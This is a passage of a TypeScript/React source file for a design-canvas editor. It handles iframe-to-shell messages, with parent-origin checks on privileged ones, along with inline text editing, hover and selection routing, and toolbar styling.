  // under trackpad input — collapse to one elementFromPoint per frame.
  const pendingHoverRef = useRef<{ deep: boolean; x: number; y: number } | null>(null);
  const hoverRafRef = useRef<number | null>(null);

  const getActiveTool = useCallback(() => tool, [tool]);

  // feature-4 (browse/move split) — a live ref to the active tool for the
  // long-lived capture listeners (dblclick) whose effects don't re-attach on a
  // tool change. In the `browse` tool every canvas gesture is a pure native
  // pass-through, so drill-select + inline text-edit must NOT fire — a
  // double-click there belongs to the mock (selecting text in a real input,
  // etc.). Press V for the Move (select) tool to edit.
  const dblToolRef = useRef(tool);
  dblToolRef.current = tool;

  const applyHover = useCallback(() => {
    hoverRafRef.current = null;
    const pending = pendingHoverRef.current;
    pendingHoverRef.current = null;
    if (!pending) return;
    const target = resolveHoverTarget(document, pending.x, pending.y, {
      deep: pending.deep,
    });
    const nextEl = target?.el ?? null;
    setHoverEl((prev) => (prev === nextEl ? prev : nextEl));
  }, []);

  // Clear hover when switching to hand mode mid-stream.
  useEffect(() => {
    if (tool === 'hand') setHoverEl(null);
  }, [tool]);

  // Listen for `dgn: 'force-clear'` from the shell — the comment composer
  // posts it on submit / cancel / Esc so the selection halo clears when the
  // user closes the composer.
  useEffect(() => {
    if (typeof window === 'undefined') return;
    // Default the canvas-shell chrome theme to dark (matches the dev-server's
    // own default + the bare `:root` --maude-chrome-* set) so a canvas that
    // never receives a `dgn:'theme'` message still renders coherent-dark and
    // the follow-chrome observer (Task 5) has a concrete value to mirror.
    if (!document.documentElement.dataset.maudeTheme) {
      document.documentElement.dataset.maudeTheme = 'dark';
    }
    const onMessage = (e: MessageEvent) => {
      const m = e.data as { dgn?: string } | null;
      if (!m || typeof m !== 'object' || !m.dgn) return;
      if (m.dgn === 'force-clear' || m.dgn === 'select-clear' || m.dgn === 'selection-clear') {
        selSet.clear();
        annotSel.clear();
        setHoverEl(null);
        return;
      }
      if (m.dgn === 'tool-set') {
        const t = (m as { tool?: string }).tool;
        if (typeof t === 'string') setTool(t as never);
        return;
      }
      // feature-4 (2026-07-20) — the Inspector's kind picker (shell-side) asks
      // the CANVAS to freeze-then-switch, because only the canvas can measure
      // boxes. Both outbound messages (convert request, kind request) leave in
      // order, so the shell's structuralWrite chain serializes them correctly
      // (freeze lands before a print-kind resize could move anything).
      if (m.dgn === 'freeze-and-set-kind') {
        // SECURITY (ethical-hacker) — accept ONLY from the parent shell, never
        // from a canvas self-post or a sibling canvas iframe (all canvases share
        // one canvasOrigin, so any frame can otherwise forge this cross-frame —
        // confused-deputy: it drives a privileged convert-to-absolute + artboard
        // kind write). Same gate as apply-style/record-edit above.
        if (e.source !== window.parent) return;
        const mm = m as {
          artboardId?: string;
          kind?: string | null;
          freeze?: boolean;
          ask?: boolean;
        };
        if (typeof mm.artboardId === 'string' && mm.artboardId) {
          const artboardId = mm.artboardId;
          const kind = typeof mm.kind === 'string' ? mm.kind : null;
          void (async () => {
            // Dogfood round 5 — `ask: true` = the CANVAS shows the freeze
            // offer itself (canvasConfirm; the shell's window.confirm is a
            // silent no-op in the Tauri WKWebView).
            let freeze = mm.freeze !== false;
            if (mm.ask === true) {
              freeze = await canvasConfirm(
                `${kind === 'print' ? 'Print' : 'Digital'} artboards work best with freely movable elements.\nAlso freeze the current layout (convert everything to position: absolute, removing invisible layout wrappers)? One-way change — ⌘Z right after still reverts it.`,
                {
                  title: kind === 'print' ? 'Switch to Print' : 'Switch to Digital',
                  confirmLabel: 'Switch + freeze',
                  cancelLabel: 'Just switch',
                }
              );
            }
            if (freeze) {
              const convert = (
                window as unknown as {
                  __maudeConvertArtboard?: (
                    id: string,
                    o?: { skipConfirm?: boolean }
                  ) => Promise<void>;
                }
              ).__maudeConvertArtboard;
              await convert?.(artboardId, { skipConfirm: true });
            }
            try {
              window.parent.postMessage(
                { dgn: 'set-artboard-kind-request', artboardId, kind },
                '*'
              );
            } catch {
              /* detached */
            }
          })();
        }
        return;
      }
      // feature-4 (2026-07-19) — generic shell→canvas result toast (convert /
      // detach success + failure feedback; the zero-visual-delta convert
      // otherwise LOOKS like nothing happened).
      if (m.dgn === 'op-toast') {
        const msg = (m as { message?: string }).message;
        if (typeof msg === 'string' && msg) showCanvasToast(msg.slice(0, 300));
        return;
      }
      // feature-4 T7b — live locked-layer set from the shell's Layers panel.
      if (m.dgn === 'locked-set') {
        const arr = (m as { locked?: unknown }).locked;
        if (Array.isArray(arr)) {
          const s = lockedKeySet();
          s.clear();
          for (const k of arr) if (typeof k === 'string') s.add(k);
        }
        return;
      }
      // Plan C — Edit menu (shell) bridges to the in-canvas undo stack.
      if (m.dgn === 'undo') {
        void afterShellRecords().then(() => undoStackRef.current.undo());
        return;
      }
      if (m.dgn === 'redo') {
        void afterShellRecords().then(() => undoStackRef.current.redo());
        return;
      }
      // Phase 12 Task 4 (DDR-103) — Layers-tree round-trip. select-by-id resolves
      // the node + replaces the selection (which posts select-set back, updating
      // the Inspect/CSS tabs + halos); highlight shows the transient hover halo;
      // request-layers re-walks + posts the tree for an artboard.
      if (m.dgn === 'select-by-id') {
        const mm = m as { id?: string; artboardId?: string | null; index?: number };
        // Dogfood follow-up — a bare ARTBOARD selection (no data-cd-id, the
        // ArtboardKnobs panel's own case) has no `mm.id` to resolve by, so
        // the element branch below never ran for it: after a structural
        // artboard write (kind/print/style/hug/resize) the Inspector kept
        // showing the PRE-edit attrs snapshot (e.g. "Digital" right after
        // switching to "Print") until the user manually re-clicked the
        // artboard. Resolve by the SAME `[data-dc-screen="<id>"]` selector
        // ArtboardKnobs itself reads its selection from (dom-selection.ts
        // `hoverTargetToSelection` "2. data-dc-screen" resolution order) when
        // there's no cdId to anchor on.
        const target = mm.id
          ? resolveSelectionEl(document, { id: mm.id, artboardId: mm.artboardId, index: mm.index })
          : mm.artboardId
            ? resolveSelectionEl(document, {
                selector: `[data-dc-screen="${CSS.escape(mm.artboardId)}"]`,
              })
            : null;
        if (target) {
          // feature-4 dogfood fix (2026-07-19) — an IDEMPOTENT re-select (the
          // shell's halo-restore ladder re-posts the same selection at 50…5000
          // ms; artboard-resync does the same) must NOT re-reveal: the user may
          // be panning elsewhere mid-ladder, and every re-post used to yank the
          // camera back to the selection ("pan skoči zpět na selected objekt").
          // Reveal only when the selection actually CHANGES.
          const cur = selSet.selected;
          const one = cur.length === 1 ? cur[0] : null;
          const sameSelection = mm.id
            ? !!one &&
              one.id === mm.id &&
              (mm.index == null || one.index == null || one.index === mm.index)
            : !!one && !one.id && one.artboardId === (mm.artboardId ?? null);
          selSet.replace(
            hoverTargetToSelection({
              el: target,
              cdId: mm.id,
              artboardId: mm.artboardId ?? null,
            } as HoverTarget)
          );
          // Task A1 — reveal THROUGH the camera, not host scroll. The old
          // `scrollIntoView` scrolled the overflow:hidden `.dc-canvas` /
          // `.dc-artboard-body` clip layers, desyncing the `.dc-world`
          // transform (Bugs A + B). `revealElementViaCamera` pans the world
          // the minimal amount only when the element is off-screen.
          const host = hostRef.current;
          if (host && zoomController && !sameSelection) {
            revealElementViaCamera(host, target as HTMLElement, zoomController);
          }
        }
        return;
      }
      if (m.dgn === 'highlight') {
        const mm = m as { id?: string; artboardId?: string | null; index?: number };
        setHoverEl(
          mm.id
            ? resolveSelectionEl(document, {
                id: mm.id,
                artboardId: mm.artboardId,
                index: mm.index,
              })
            : null
        );
        return;
      }
      // Phase 12.3 (W1.1) — optimistic inline-style apply. The CSS panel posts
      // this on commit so the selected element updates INSTANTLY, before the
      // edit-css → file-watcher HMR reload re-renders from source. `value` null/
      // empty removes the property (the reset path). Purely a live-DOM preview;
      // the authoritative value is whatever the reload renders from source.
      // SECURITY (ethical-hacker A1/A2) — accept apply-style ONLY from the parent
      // shell, never from a canvas self-post. The canvas iframe is untrusted
      // (DDR-054); without this gate hostile canvas JS could repaint elements AND
      // (paired with the reload echo-guard) suppress reloads to desync view/source.
      // The reload-suppression timestamp now lives in _shell.html's closure (NOT a
      // canvas-writable window global) — set there from the same parent-gated msg.
      if (m.dgn === 'apply-style') {
        if (e.source !== window.parent) return;
        const mm = m as {
          id?: string;
          artboardId?: string | null;
          index?: number;
          prop?: string;
          value?: string | null;
        };
        if (mm.id && mm.prop) {
          const target = resolveSelectionEl(document, {
            id: mm.id,
            artboardId: mm.artboardId,
            index: mm.index,
          });
          if (target) {
            const style = (target as HTMLElement).style;
            try {
              // Live-DOM preview only; the reload renders the authoritative value.
              if (mm.value == null || mm.value === '') style.removeProperty(mm.prop);
              else style.setProperty(mm.prop, mm.value);
            } catch {
              /* invalid prop/value — ignore; the reload is the source of truth */
            }
          }
        }
        return;
      }
      // Inline-edit undo (DDR-103/104 follow-up). The shell's inspector posts
      // this AFTER it has applied a CSS / attribute edit (`/_api/edit-css` /
      // `/_api/edit-attr`), so we RECORD it onto the in-canvas undo stack
      // (append without re-running do() — the edit already landed) and Cmd+Z
      // can invert it. Inline TEXT edits originate in this iframe and record
      // themselves directly (see commitEdit). PARENT-ORIGIN ONLY (DDR-054):
      // a hostile canvas self-post must not be able to plant fake undo entries.
      if (m.dgn === 'record-edit') {
        if (e.source !== window.parent) return;
        const p = (m as { payload?: Partial<EditSourcePayload> & { seq?: number; label?: string } })
          .payload;
        // Phase 12.1 — a landed reorder (drag / keyboard move). The shell POSTed
        // /_api/reorder already; record so Cmd+Z reverts via the server's log.
        if (p && (p as { op?: string }).op === 'reorder') {
          if (typeof p.canvas === 'string' && typeof p.seq === 'number') {
            undoStack.record(
              buildReorderRecord(
                { canvas: p.canvas, seq: p.seq },
                typeof p.label === 'string' ? p.label : undefined
              )
            );
          }
          return;
        }
        if (
          p &&
          (p.op === 'css' || p.op === 'text' || p.op === 'attr') &&
          typeof p.canvas === 'string' &&
          typeof p.id === 'string'
        ) {
          undoStack.record(
            buildEditSourceRecord({
              op: p.op as EditSourceOp,
              canvas: p.canvas,
              id: p.id,
              key: typeof p.key === 'string' ? p.key : '',
              before: typeof p.before === 'string' ? p.before : null,
              after: typeof p.after === 'string' ? p.after : null,
            })
          );
        }
        return;
      }
      if (m.dgn === 'request-layers') {
        postLayersTree((m as { artboardId?: string }).artboardId ?? null);
        return;
      }
      // D9 — canvas-shell chrome follows the Maude chrome theme. The chrome's
      // `--maude-chrome-*` token family is keyed by `data-maude-theme` on the
      // iframe documentElement (see HUD_TOKENS_CSS). This attribute is
      // DELIBERATELY separate from the DS `data-theme`: it only re-themes the
      // floating chrome, never the artboard palettes. Followers (per-artboard
      // "Follow chrome") restamp via the MutationObserver in CanvasShell.
      if (m.dgn === 'theme') {
        const t = (m as { theme?: string }).theme;
        if (t === 'light' || t === 'dark') {
          document.documentElement.dataset.maudeTheme = t;
        }
        return;
      }
      // Shell View-menu zoom items — route to the live viewport controller
      // (the same methods the in-canvas zoom pill calls).
      if (m.dgn === 'zoom' && zoomController) {
        const op = (m as { op?: string }).op;
        if (op === 'in') zoomController.zoomIn();
        else if (op === 'out') zoomController.zoomOut();
        else if (op === 'fit') zoomController.fit();
        else if (op === 'actual') zoomController.reset();
        return;
      }
      // Shell View-menu chrome toggles + Presentation Mode. Only the fields the
      // shell sends are merged, so a `{ present: true }` enter keeps the user's
      // individual minimap/zoom toggles for the eventual exit. `guides` (T6) is
      // the odd one out — per-CANVAS persisted state, not a global pref — but
      // rides the same live-broadcast channel; the shell PATCHes view.json
      // separately (see setGuidesVisible in app.jsx).
      if (m.dgn === 'view-chrome' && chromeCtx) {
        const mm = m as {
          minimap?: boolean;
          zoom?: boolean;
          present?: boolean;
          guides?: boolean;
          print?: boolean;
        };
        const patch: {
          minimap?: boolean;
          zoom?: boolean;
          present?: boolean;
          guides?: boolean;
          print?: boolean;
        } = {};
        if (typeof mm.minimap === 'boolean') patch.minimap = mm.minimap;
        if (typeof mm.zoom === 'boolean') patch.zoom = mm.zoom;
        if (typeof mm.present === 'boolean') patch.present = mm.present;
        if (typeof mm.guides === 'boolean') patch.guides = mm.guides;
        // feature-2-print-artboards T3 — "Show print guides" (bleed/trim/
        // margin overlay). Same per-canvas-persisted shape as `guides`.
        if (typeof mm.print === 'boolean') patch.print = mm.print;
        // Dogfood follow-up — mirror `guides`/`print` into the in-iframe
        // `window.__canvas_meta__.overlays` snapshot, exactly like the
        // existing viewport/layout mirror in canvas-lib.tsx's onSettle (DDR-
        // 138 comment: "populated ONCE at page load — so after a settle, a
        // soft HMR remount (any module edit: text, reorder, agent edit)
        // would re-read the STALE page-load [value]"). Without this, a
        // structural edit AFTER toggling guides on (e.g. a kind switch,
        // which is exactly such an edit) remounts DesignCanvasInner, its
        // `guidesSeededRef` self-seed effect re-fires, and reads the stale
        // page-load overlays snapshot — silently reverting a live-toggled
        // guide back to hidden even though the View-menu checkbox still
        // shows it checked. Same class of bug DDR-138 fixed for the camera;
        // this is its `overlays` counterpart.
        if (patch.guides !== undefined || patch.print !== undefined) {
          const w = window as unknown as {
            __canvas_meta__?: { overlays?: Record<string, boolean> };
          };
          if (w.__canvas_meta__) {
            w.__canvas_meta__.overlays = {
              ...w.__canvas_meta__.overlays,
              ...(patch.guides !== undefined ? { guides: patch.guides } : {}),
              ...(patch.print !== undefined ? { print: patch.print } : {}),
            };
          }
        }
        chromeCtx.setChrome(patch);
        return;
      }
    };
    window.addEventListener('message', onMessage);
    return () => window.removeEventListener('message', onMessage);
  }, [selSet, annotSel, setTool, undoStack, zoomController, chromeCtx, hostRef]);

  // Phase 12 (DDR-103) — double-click a LEAF-TEXT element (children all text
  // nodes) to edit its copy in place. Commit (blur / Enter) posts `dgn:edit-text`
  // to the shell, which calls the main-origin /_api/edit-text → editText writes
  // the escaped JSXText to source; the file-watcher HMR reload re-renders from
  // the persisted source. Esc restores the original. Mixed/expression elements
  // are skipped (the engine would refuse them anyway — honest no-op).
  useEffect(() => {
    if (typeof document === 'undefined') return;
    const host = hostRef.current;
    if (!host) return;
    let editing: HTMLElement | null = null;
    let original = '';
    // Unified custom blinking caret (text-caret.ts) — mounted for the whole
    // edit session, disposed in teardown. Hides the native caret while up.
    let caretDispose: (() => void) | null = null;
    // DDR-150 P1 — the committed-but-unconfirmed edit, so a shell rejection
    // (dynamic/mixed content the engine refuses) can revert the optimistic
    // contenteditable text instead of letting it silently vanish on the next
    // reload. Mirrors the reorder-failed revert below. Cleared on revert.
    let lastTextCommit: { el: HTMLElement; original: string } | null = null;
    const onBlur = (): void => commitEdit(true);
    const onKey = (e: KeyboardEvent): void => {
      if (e.key === 'Escape') {
        e.preventDefault();
        commitEdit(false);
      } else if (e.key === 'Enter' && !e.shiftKey) {
        e.preventDefault();
        (e.currentTarget as HTMLElement | null)?.blur?.();
      }
    };
    function teardown(elx: HTMLElement): void {
      caretDispose?.();
      caretDispose = null;
      elx.removeAttribute('contenteditable');
      elx.classList.remove('dc-text-editing');
      elx.removeEventListener('blur', onBlur, true);
      elx.removeEventListener('keydown', onKey, true);
    }
    function commitEdit(commit: boolean): void {
      const elx = editing;
      if (!elx) return;
      editing = null;
      const text = (elx.textContent ?? '').trim();
      teardown(elx);
      if (!commit) {
        elx.textContent = original;
        return;
      }
      if (text === original.trim()) return;
      const cdId = elx.getAttribute('data-cd-id');
      if (!cdId) return;
      const file = deriveFile();
      // For `{variable}` text the engine needs to know WHICH rendered instance
      // this is (a `.map()` renders one source element N×) — its index among
      // same-cd-id nodes — plus the pre-edit text to target the right array
      // item. Harmless for literal text (the engine ignores both there).
      let occurrence = 0;
      try {
        const sameId = Array.from(document.querySelectorAll(`[data-cd-id="${CSS.escape(cdId)}"]`));
        occurrence = Math.max(0, sameId.indexOf(elx));
      } catch {
        /* querySelectorAll/CSS.escape unavailable — occurrence stays 0 */
      }
      try {
        window.parent.postMessage(
          { dgn: 'edit-text', id: cdId, file, text, occurrence, before: original.trim() },
          '*'
        );
      } catch {
        /* detached / cross-origin */
      }
      // Stash the optimistic edit so a shell rejection can revert it (DDR-150 P1).
      lastTextCommit = { el: elx, original };
      // Record onto the in-canvas undo stack so Cmd+Z reverts the rewrite. The
      // edit already posted above (record, don't re-run do()). before/after are
      // the trimmed bodies the edit-text endpoint persists.
      //
      // ONLY the record is gated on `file`. An earlier version of this guard
      // sat above the `postMessage` and returned out of the whole function —
      // which silently dropped THE EDIT ITSELF, not just an unusable undo
      // entry. `deriveFile` returning undefined must not cost the user their
      // typing; it costs them only a Cmd+Z step they could not have applied
      // anyway (a record with no canvas is one undo can never target).
      if (!file) return;
      undoStackRef.current.record(
        buildEditSourceRecord({
          op: 'text',
          canvas: file,
          id: cdId,
          key: '',
          before: original.trim(),
          after: text,
          // Carry the occurrence so undo/redo can re-target a `{variable}` edit
          // (the .map()/component-prop resolution needs it — canvas-edit.ts).
          occurrence,
        })
      );
    }
    // Enter contenteditable edit mode on a leaf-text `stamped` element, caret
    // placed at (clientX, clientY) rather than a full select-all (that used to
    // force a delete-and-retype for any edit that isn't a full replace).
    // `caretRangeFromPoint` (WebKit/Chromium) and its standardized successor
    // `caretPositionFromPoint` (Firefox + newer engines) both resolve the
    // exact character under the pointer; select-all-contents is the fallback
    // only when neither exists. Extracted so both the native dblclick path
    // AND the annotation Text-tool's click-through (maude:enter-text-edit,
    // dispatched from annotations-layer.tsx when its own click lands on an
    // existing editable element) share one entry point.
    function enterEditModeAt(
      stamped: HTMLElement,
      clientX: number,
      clientY: number,
      opts?: { selectAll?: boolean }
    ): void {
      if (editing) return;
      // Cloud Phase 25 C2 — inline text edit is a source write; a read-only
      // canvas never enters edit mode (one gate for BOTH entry points: the
      // dblclick drill and the annotation Text-tool click-through).
      if (isReadOnlyCanvas()) return;
      editing = stamped;
      original = stamped.textContent ?? '';
      stamped.setAttribute('contenteditable', 'plaintext-only');
      stamped.classList.add('dc-text-editing');
      stamped.addEventListener('blur', onBlur, true);
      stamped.addEventListener('keydown', onKey, true);
      stamped.focus();
      if (opts?.selectAll) {
        // feature-4 text-gestures (user steer 2026-07-20) — the DBLCLICK entry
        // selects ALL text (Figma: reaching the leaf via the drill ladder puts
        // the whole string under your fingers, ready to overwrite). Subsequent
        // clicks/dblclicks inside the editor are native (the router bails on
        // editable targets): click = caret, dblclick = word, triple = all.
        try {
          const sel = window.getSelection();
          const range = document.createRange();
          range.selectNodeContents(stamped);
          sel?.removeAllRanges();
          sel?.addRange(range);
        } catch {
          placeCaretAt(stamped, window, { x: clientX, y: clientY });
        }
      } else {
        // Unified placement chain (text-caret.ts) — the annotation editors use
        // the exact same helper, so caret-at-click can never diverge per surface.
        placeCaretAt(stamped, window, { x: clientX, y: clientY });
      }
      caretDispose = mountCaret(stamped, window);
    }
    const onDbl = (e: MouseEvent): void => {
      if (editing) return;
      // feature-4 — browse is a pure pass-through: no drill-select, no inline
      // text-edit. The mock owns its own double-clicks. Press V to edit.
      if (dblToolRef.current === 'browse') return;
      const t = e.target as HTMLElement | null;
      const stamped = (t?.closest?.('[data-cd-id]') as HTMLElement | null) ?? null;
      if (!stamped) return;
      const kids = Array.from(stamped.childNodes);
      const isLeafText = kids.length > 0 && kids.every((n) => n.nodeType === 3);
      // Task L6 + feature-4 dogfood fix (2026-07-19) — the Figma ordering: each
      // double-click drills ONE level along the clicked element's stamped
      // ancestor chain; text edit opens only when the LEAF ITSELF is already
      // selected (the drill has reached it). Previously a dblclick on leaf
      // text jumped straight to the editor from any depth, so the drill ladder
      // never ran on text-bearing targets.
      const sel0 = textSelectionRef.current.selected;
      const currentId = sel0.length === 1 ? sel0[0]?.id : undefined;
      const leafReached = isLeafText && currentId === stamped.getAttribute('data-cd-id');
      if (!leafReached) {
        // Drill ONE level past whatever's currently selected along this
        // click's own stamped-ancestor chain (repeated double-clicks walk
        // progressively deeper; the chain's last rung is the clicked element
        // itself); default to the outermost rung when nothing in the chain is
        // currently selected.
        const chain = stampedChainToBody(stamped);
        if (chain.length > 0) {
          const curIdx = currentId
            ? chain.findIndex((n) => n.getAttribute('data-cd-id') === currentId)
            : -1;
          const next = curIdx >= 0 && curIdx + 1 < chain.length ? chain[curIdx + 1] : chain[0];
          if (next) {
            e.preventDefault();
            e.stopPropagation();
            const cdId = next.getAttribute('data-cd-id');
            const artboardId =
              (next.closest('[data-dc-screen]') as HTMLElement | null)?.getAttribute(
                'data-dc-screen'
              ) ?? null;
            textSelectionRef.current.replace(
              hoverTargetToSelection({ el: next, cdId, artboardId } as HoverTarget)
            );
          }
        }
        return;
      }
      e.preventDefault();
      e.stopPropagation();
      // Phase 6 (unified-text-editing) — only offer inline edit where the
      // engine will actually save: the build-time data-cd-editable marker
      // (canvas-pipeline.ts) mirrors applyTextEdit's acceptance. The DOM-only
      // isLeafText heuristic above can't tell `<p>Total: {1 + 1} items</p>`
      // (mixed source, engine refuses, DDR-150 dead end) from honest static
      // text — the AST-stamped marker can.
      if (!stamped.hasAttribute('data-cd-editable')) {
        showCanvasToast(
          'This text is filled in from code (a variable) — edit it via chat or /design:edit.'
        );
        return;
      }
      enterEditModeAt(stamped, e.clientX, e.clientY, { selectAll: true });
    };
    // Dogfood fix — the annotation Text tool's click-through: clicking an
    // existing editable element with the Text (T) tool active should edit
    // THAT text in place instead of dropping a new standalone annotation on
    // top of it. annotations-layer.tsx hit-tests past its own input-capture
    // overlay and dispatches this when the click resolves to a leaf-text
    // `[data-cd-id]` element; canvas-shell owns the DOM/contentEditable side
    // of editing, so it's the one that must act on it.
    const onEnterTextEdit = (e: Event): void => {
      const detail = (e as CustomEvent<{ el?: HTMLElement; clientX?: number; clientY?: number }>)
        .detail;
      if (!detail?.el || !host.contains(detail.el)) return;
      enterEditModeAt(detail.el, detail.clientX ?? 0, detail.clientY ?? 0);
    };
    // The shell rejected the last inline text edit — revert the optimistic
    // contenteditable text so the canvas reflects the true (unsaved) source
    // rather than a change that silently disappears on the next reload (DDR-150 P1).
    const onEditReverted = (e: MessageEvent): void => {
      if (e.source !== window.parent) return;
      const m = e.data as { dgn?: string; op?: string; reason?: string } | null;
      if (m?.dgn !== 'edit-reverted' || m.op !== 'text' || !lastTextCommit) return;
      try {
        lastTextCommit.el.textContent = lastTextCommit.original;
      } catch {
        /* detached — a subsequent reload re-syncs */
      }
      showCanvasToast(
        `Couldn't save that text — ${m.reason || 'not editable inline'}. Edit it via chat.`
      );
      lastTextCommit = null;
    };
    // Capture phase so we beat the fit-to-view dblclick handler.
    host.addEventListener('dblclick', onDbl, true);
    window.addEventListener('message', onEditReverted);
    document.addEventListener('maude:enter-text-edit', onEnterTextEdit);
    return () => {
      host.removeEventListener('dblclick', onDbl, true);
      window.removeEventListener('message', onEditReverted);
      document.removeEventListener('maude:enter-text-edit', onEnterTextEdit);
      if (editing) teardown(editing);
    };
  }, [hostRef]);

  // Cleanup any pending rAF on unmount.
  useEffect(
    () => () => {
      if (hoverRafRef.current != null && typeof cancelAnimationFrame !== 'undefined') {
        cancelAnimationFrame(hoverRafRef.current);
      }
    },
    []
  );

  useInputRouter({
    hostRef,
    getActiveTool,
    callbacks: {
      onHover: ({ deep, clientX, clientY }) => {
        pendingHoverRef.current = { deep, x: clientX, y: clientY };
        if (hoverRafRef.current == null && typeof requestAnimationFrame !== 'undefined') {
          hoverRafRef.current = requestAnimationFrame(applyHover);
        }
      },
      onSelect: ({ mode, deep, clientX, clientY }) => {
        const target = resolveHoverTarget(document, clientX, clientY, { deep });
        if (!target) {
          // No-target click (canvas chrome / dead space) — DO NOT auto-clear
          // the selection. Esc is the canonical deselect gesture; click-to-
          // clear loses the user's selection on accidental misses. The empty
          // marquee path (artboard-marquee.tsx) likewise never clears unless
          // it actually captured something.
          return;
        }
        // feature-4 T7b — a locked layer can't be selected from the canvas
        // (the Layers panel row still can, so it stays reachable to unlock).
        if (isLockedElement(target.el, target.cdId)) return;
        // feature-4 escape hatch (user steer 2026-07-19) — a Cmd+click select
        // from BROWSE means "I want to edit now": flip to the Move (select)
        // tool so the follow-up gestures (drag, dblclick drill, keyboard)
        // work without a separate V press.
        if (tool === 'browse') setTool('move');
        // feature-4 dogfood fix (2026-07-19) — Figma's "entered group" context:
        // a bare (top-mode) click INSIDE the currently selected element keeps
        // that selection instead of resetting to the top-level ancestor.
        // Without this the dblclick drill ladder could never descend past one
        // level — the dblclick's own pointerdown(detail:2) re-selected the top
        // object right before the drill ran. Clicking OUTSIDE the current
        // selection (a sibling, empty space) still re-selects normally.
        if (!deep && mode === 'replace') {
          const cur = selSet.selected;
          const one = cur.length === 1 ? cur[0] : null;
          if (one?.id) {
            const curEl = resolveSelectionEl(document, one);
            const hitEl = document.elementFromPoint(clientX, clientY);
            if (
              curEl &&
              hitEl &&
              curEl !== target.el &&
              curEl.contains(hitEl) &&
              target.el &&
              target.el.contains(curEl)
            ) {
              return; // stay in the entered-group context
            }
          }
        }
        const sel = hoverTargetToSelection(target);
        if (mode === 'replace') selSet.replace(sel);
        else selSet.add(sel);
        // Phase 12 Task 4 — refresh the Layers tree for the selected artboard.
        postLayersTree(target.artboardId);
      },
      onContextMenu: ({ clientX, clientY }) => {
        const target = resolveHoverTarget(document, clientX, clientY, { deep: true });
        const kind = classifyContextKind(target);
        const ctxTarget: ContextTarget = {
          kind,
          el: target?.el ?? null,
          cdId: target?.cdId ?? null,
          artboardId: target?.artboardId ?? null,
          clientX,
          clientY,
        };
        ctxMenu.open(ctxTarget);
      },
      onTool: ({ tool: t }) => setTool(t),
      onUndo: () => {
        void afterShellRecords().then(() => undoStackRef.current.undo());
      },
      onRedo: () => {
        void afterShellRecords().then(() => undoStackRef.current.redo());
      },
      onEscape: () => {
        // T21 — abort any mid-stroke draw FIRST. The annotations layer
        // listens for `maude:cancel-stroke` and drops the in-progress
        // shape without committing.
        try {
          document.dispatchEvent(new CustomEvent('maude:cancel-stroke'));
        } catch {
          /* non-DOM env */
        }
        // T19 — clear sticky-tool lock + flip back to the mode's resting tool
        // (DDR-223: move in edit, browse in preview). Esc is the canonical
        // "back to default state" gesture across canvas apps.
        clearSticky();
        resetTool();
        ctxMenu.close();
        selSet.clear();
        annotSel.clear();
        setHoverEl(null);
      },
      // onDropComment is intentionally absent — the comment drop is owned by
      // the shell-owned comment mount layer's router (canvas-comment-mount.tsx),
      // which sits as an ancestor capture-listener over this canvas. In comment
      // mode that ancestor claims `drop-comment` before this router sees it.
    },
  });

  // Cloud Phase 25 C2 — a read-only canvas mounts no EDIT chrome (resize /
  // spacing / grid handles, reorder drag, contextual + multi-artboard
  // toolbars). Editing is absent, not disabled. Selection, halos, measure,
  // annotations DISPLAY, cursors and presence all stay — they read.
  const readOnly = isReadOnlyCanvas();
  return (
    <>
      {children}
      {/* CommentsOverlay is mounted ONCE by the shell-owned comment mount layer
          (canvas-comment-mount.tsx), not here — single instance per surface. */}
      <AnnotationsLayer />
      <ToolPalette />
      <ArtboardMarqueeOverlay />
      <ElementMarqueeOverlay />
      <HoverHalo el={hoverEl} />
      <SelectionHalos />
      {!readOnly && <ElementResizeOverlay />}
      {!readOnly && <SpacingHandlesOverlay />}
      {!readOnly && <GridTrackHandlesOverlay />}
      {!readOnly && <ReorderDrag />}
      <LayersLiveSync />
      <GroupBbox />
      {!readOnly && <EqualSpacingHandles />}
      <MeasureOverlay />
      {!readOnly && <ContextualToolbar />}
      {!readOnly && (
        <MultiArtboardToolbar
          distributeArtboards={distributeArtboards}
          alignArtboards={alignArtboards}
        />
      )}
      <SnapGuideOverlay />
      <PhotoPreviewBridge />
      <UndoHud />
      <CursorsOverlay />
      <AiBanner />
      <ParticipantsChrome />
    </>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// MultiArtboardToolbar — floating chrome anchored above the group bbox when
// ≥ 2 artboards are multi-selected. Primary surface for the distribute
// commands (post-Wave-2 feedback preferred this over global ⌘⌥H / ⌘⌥V
// hotkeys). Disabled state when fewer than 3 artboards are selected — the
// math is undefined for 2.

const MULTI_TOOLBAR_CSS = `
.dc-multi-artboard-tb {
  position: fixed;
  pointer-events: auto;
  z-index: 6;
  display: none;
  align-items: stretch;
  gap: 2px;
  padding: 4px;
  background: var(--maude-chrome-bg-0, #ffffff);
  border: 1px solid var(--maude-chrome-fg-0, #1c1917);
  border-radius: 8px;
  box-shadow: 0 6px 24px var(--maude-chrome-shadow, color-mix(in oklab, #1c1917 10%, transparent));
  font-family: var(--maude-chrome-font-mono, ui-monospace, SFMono-Regular, Menlo, monospace);
  font-size: 11px;
  letter-spacing: 0.02em;
  color: var(--maude-chrome-fg-0, #1a1a1a);
  user-select: none;
}
.dc-multi-artboard-tb button {
  appearance: none;
  background: transparent;
  border: 0;
  border-radius: 6px;
  padding: 4px 10px;
  font: inherit;
  cursor: pointer;
  color: inherit;
  display: inline-flex;
  align-items: center;
  gap: 6px;
  transition: background-color 80ms linear;
}
.dc-multi-artboard-tb button:hover:not(:disabled) {
  background: color-mix(in oklab, var(--maude-hud-accent, #d63b1f) 8%, transparent);
}
.dc-multi-artboard-tb button:disabled {
  cursor: default;
  opacity: 0.4;
}
.dc-multi-artboard-tb .dc-mab-count {
  padding: 4px 8px 4px 10px;
  color: var(--maude-chrome-fg-1, rgba(40,30,20,0.7));
  border-right: 1px solid var(--maude-chrome-border, rgba(0,0,0,0.08));
  margin-right: 2px;
  font-variant-numeric: tabular-nums;
}
.dc-multi-artboard-tb .dc-mab-icon {
  display: inline-flex;
  align-items: center;
  justify-content: center;
}
.dc-multi-artboard-tb .dc-mab-divider {
  width: 1px;
  align-self: stretch;
  background: var(--maude-chrome-border, rgba(0,0,0,0.10));
  margin: 0 4px;
}
@media (prefers-reduced-motion: reduce) {
  .dc-multi-artboard-tb button { transition: none; }
}
`.trim();

function ensureMultiToolbarStyles(): void {
  if (typeof document === 'undefined') return;
  if (document.getElementById('dc-multi-artboard-tb-css')) return;
  const s = document.createElement('style');
  s.id = 'dc-multi-artboard-tb-css';
  s.textContent = MULTI_TOOLBAR_CSS;
  document.head.appendChild(s);
}

